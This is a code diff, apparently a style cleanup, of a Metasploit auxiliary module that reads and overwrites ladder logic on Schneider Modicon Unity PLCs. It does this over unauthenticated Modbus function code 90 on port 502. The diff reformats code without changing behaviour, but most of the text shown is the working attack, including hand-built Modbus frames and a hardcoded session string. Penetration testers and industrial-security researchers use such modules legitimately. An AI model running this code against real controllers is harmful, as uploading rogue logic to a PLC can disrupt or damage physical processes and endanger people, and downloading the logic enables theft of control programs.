@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,60 +7,57 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Rex::Socket::Tcp
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Schneider Modicon Ladder Logic Upload/Download',
-      'Description'    => %q{
-        The Schneider Modicon with Unity series of PLCs use Modbus function
-        code 90 (0x5a) to send and receive ladder logic.  The protocol is
-        unauthenticated, and allows a rogue host to retrieve the existing
-        logic and to upload new logic.
+                      'Name'           => 'Schneider Modicon Ladder Logic Upload/Download',
+                      'Description'    => %q{
+                        The Schneider Modicon with Unity series of PLCs use Modbus function
+                        code 90 (0x5a) to send and receive ladder logic.  The protocol is
+                        unauthenticated, and allows a rogue host to retrieve the existing
+                        logic and to upload new logic.
 
-        Two modes are supported: "SEND" and "RECV," which behave as one might
-        expect -- use 'set mode ACTIONAME' to use either mode of operation.
+                        Two modes are supported: "SEND" and "RECV," which behave as one might
+                        expect -- use 'set mode ACTIONAME' to use either mode of operation.
 
-        In either mode, FILENAME must be set to a valid path to an existing
-        file (for SENDing) or a new file (for RECVing), and the directory must
-        already exist.  The default, 'modicon_ladder.apx' is a blank
-        ladder logic file which can be used for testing.
+                        In either mode, FILENAME must be set to a valid path to an existing
+                        file (for SENDing) or a new file (for RECVing), and the directory must
+                        already exist.  The default, 'modicon_ladder.apx' is a blank
+                        ladder logic file which can be used for testing.
 
-        This module is based on the original 'modiconstux.rb' Basecamp module from
-        DigitalBond.
-      },
-      'Author'         =>
-        [
-          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
-          'todb' # Metasploit fixups
-        ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
-        ],
-      'DisclosureDate' => 'Apr 5 2012'
-      ))
+                        This module is based on the original 'modiconstux.rb' Basecamp module from
+                        DigitalBond.
+                      },
+                      'Author'         =>
+                        [
+                          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
+                          'todb' # Metasploit fixups
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
+                        ],
+                      'DisclosureDate' => 'Apr 5 2012'))
 
     register_options(
       [
         OptString.new('FILENAME',
-          [
-            true,
-            "The file to send or receive",
-            File.join(Msf::Config.data_directory, "exploits", "modicon_ladder.apx")
-          ]),
+                      [
+                        true,
+                        "The file to send or receive",
+                        File.join(Msf::Config.data_directory, "exploits", "modicon_ladder.apx")
+                      ]),
         OptEnum.new("MODE", [true, 'File transfer operation', "SEND",
-          [
-            "SEND",
-            "RECV"
-          ]
-        ]),
+                             [
+                               "SEND",
+                               "RECV"
+                             ]]),
         Opt::RPORT(502)
-      ], self.class)
-
+      ], self.class
+    )
   end
 
   def run
@@ -95,7 +93,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     payload = ""
     payload += [@modbuscounter].pack("n")
-    payload += "\x00\x00\x00" #dunno what these are
+    payload += "\x00\x00\x00" # dunno what these are
     payload += [packetdata.size].pack("c") # size byte
     payload += packetdata
   end
@@ -106,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
     @modbuscounter += 1
     # TODO: Fix with sock.timed_read -- Should make it faster, just need a test.
     r = sock.recv(65535, 0.1)
-    return r
+    r
   end
 
   # This function sends some initialization requests
@@ -159,7 +157,7 @@ class MetasploitModule < Msf::Auxiliary
     sendframe(makeframe(payload))
     payload = "\x00\x5a\x00\x10\x43\x4c\x00\x00\x0f"
     payload += "USER-714E74F21B" # Yep, really
-    #payload += "META-SPLOITMETA"
+    # payload += "META-SPLOITMETA"
     sendframe(makeframe(payload))
     payload = "\x00\x5a\x01\x04"
     sendframe(makeframe(payload))
@@ -192,17 +190,15 @@ class MetasploitModule < Msf::Auxiliary
   def writefile
     print_status "#{rhost}:#{rport} - MODBUS - Sending write request"
     blocksize = 244	# bytes per block in file transfer
-    buf = File.open(datastore['FILENAME'], 'rb') { |io| io.read }
+    buf = File.open(datastore['FILENAME'], 'rb', &:read)
     fullblocks = buf.length / blocksize
     if fullblocks > 255
       print_error("#{rhost}:#{rport} - MODBUS - File too large, aborting.")
       return
     end
-    lastblocksize = buf.length - (blocksize*fullblocks)
+    lastblocksize = buf.length - (blocksize * fullblocks)
     fileblocks = fullblocks
-    if lastblocksize != 0
-      fileblocks += 1
-    end
+    fileblocks += 1 if lastblocksize != 0
     filetype = buf[0..2]
     if filetype == "APX"
       filenum = "\x01"
@@ -249,7 +245,7 @@ class MetasploitModule < Msf::Auxiliary
         return
       end
       # redo this iteration of the loop if we're on block 2
-      if block2status == 0 and block == 2
+      if (block2status == 0) && (block == 2)
         print_status("#{rhost}:#{rport} - MODBUS - Sending block 2 a second time")
         block2status = 1
         redo
@@ -261,7 +257,7 @@ class MetasploitModule < Msf::Auxiliary
       payload += filenum
       payload += [block].pack("c")
       payload += "\x00" + [lastblocksize].pack("c") + "\x00"
-      payload += buf[((block-1) * 244)..(((block-1) * 244) + lastblocksize)]
+      payload += buf[((block - 1) * 244)..(((block - 1) * 244) + lastblocksize)]
       vprint_status "#{rhost}:#{rport} - MODBUS - Block #{block}: #{payload.inspect}"
       res = sendframe(makeframe(payload))
       if res[8..9] != "\x01\xfe"
@@ -284,7 +280,7 @@ class MetasploitModule < Msf::Auxiliary
     block = 1
     filedata = ""
     finished = false
-    while !finished
+    until finished
       payload = "\x00\x5a\x01\x34\x00\x01"
       payload += [block].pack("c")
       payload += "\x00"
@@ -305,7 +301,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def cleanup
-    disconnect rescue nil
+    begin
+      disconnect
+    rescue
+      nil
+    end
   end
-
 end
